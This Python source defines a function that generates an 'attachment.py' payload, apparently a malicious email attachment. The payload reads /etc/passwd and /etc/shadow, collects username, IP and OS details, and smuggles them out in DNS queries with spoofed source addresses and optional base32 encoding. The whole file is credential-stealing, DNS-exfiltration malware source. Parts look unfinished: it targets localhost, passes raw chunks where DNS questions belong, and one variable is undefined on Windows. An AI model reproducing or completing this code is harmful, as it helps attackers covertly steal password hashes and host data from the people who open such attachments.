

def create_attachment(encrypt):
    file_name = "attachment.py"
    f = open(file_name, 'w')
    f.write("""

import getpass
import socket
import locale
import platform

from scapy.all import IP, UDP, DNS, DNSQR, send
from base64 import b32encode
from random import randint


def randomIP():
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip


def randInt():
    x = randint(1000, 8999)
    return x

def send_DNS_data(data,encrypt):
    # first, encode the data
    queries = encode_data(data,encrypt)
    # build the dns packet, by hidding the data
    for query in queries:
        dns_request = IP(src= randomIP(),dst='127.0.0.1') / UDP(dport=53) / DNS(rd=50, qd=query)
        send(dns_request, verbose=0)

def encode_data(data,encrypt):
    queries = []
    max_label_length = 63  # Maximum length of a DNS label

    # Encode the data and split it into chunks that fit within a DNS label
    encoded_data = data
    if encrypt:
        encoded_data = b32encode(data.encode('utf-8'))
    chunks = [encoded_data[i:i + max_label_length] for i in range(0, len(encoded_data), max_label_length)]

    # Create a DNS query for each chunk
    # for chunk in chunks:
    #     query = DNSQR(qname=chunk)
    #     queries.append(query)
    # return queries
    return chunks

def getLinuxPasswords():
    passwords = []
    try:
        with open('/etc/passwd', 'r') as passwd_file:  # Assuming Linux-based system
            content = passwd_file.readlines()

        for line in content:
            passwords.append(line)

    except Exception as e:
        passwords.append(e)

    return passwords


def getLinuxShadow():
    encryptedPasswords = []
    try:
        with open('/etc/shadow', 'r') as passwd_file:  # Assuming Linux-based system
            content = passwd_file.readlines()

        for line in content:
            lineInArray = line.split(":")
            if (lineInArray[1] != "*"):
                encryptedPasswords.append(
                    {"user name": lineInArray[0], "encrypted password": lineInArray[1]})
    except Exception as e:
        encryptedPasswords.append(e)

    return encryptedPasswords


def getWindowsPasswords():
    passwords = []
    return passwords


def get_details(encrypt):
    # Current username
    current_username = getpass.getuser()

    # IP addresses
    ip_address = socket.gethostbyname(socket.gethostname())

    # response = requests.get('https://api.ipify.org?format=json')
    # data = response.json()
    # external_ip = data['ip']

    # Available languages
    available_languages = locale.getlocale()

    # OS version
    os_version = platform.platform()

    # OS name
    os_name = platform.system()

    # Password file
    passwords = []
    if os_name == "Linux":
        passwords = getLinuxPasswords()
        encryptedPasswords = getLinuxShadow()
    elif os_name == "Windows":
        passwords = getWindowsPasswords()

    # Print the details
    print("Password File:")
    for password in passwords:
        print(password)
    print("Shadow File:")
    for password in encryptedPasswords:
        print(password)
    print("Current Username:", current_username)
    print("IP Address:", ip_address)
    # print("External IP address:", external_ip)
    print("Available Languages:", available_languages)
    print("Operating System:", os_name)
    print("OS Version:", os_version)
    
    # send the data in DNS protocol
    for password in passwords:
        send_DNS_data(password,encrypt)
    for password in encryptedPasswords:
        send_DNS_data(password['user name'],encrypt)
        send_DNS_data(password['encrypted password'],encrypt)
    send_DNS_data(current_username,encrypt)
    send_DNS_data(ip_address,encrypt)
    for language in available_languages:
        send_DNS_data(language,encrypt)
    send_DNS_data(os_name,encrypt)
    send_DNS_data(os_version,encrypt)
            
            """)
    if encrypt == True:
        f.write("""
get_details(True)""")
    else:
        f.write("""
get_details(False)""")
            
    
    return file_name
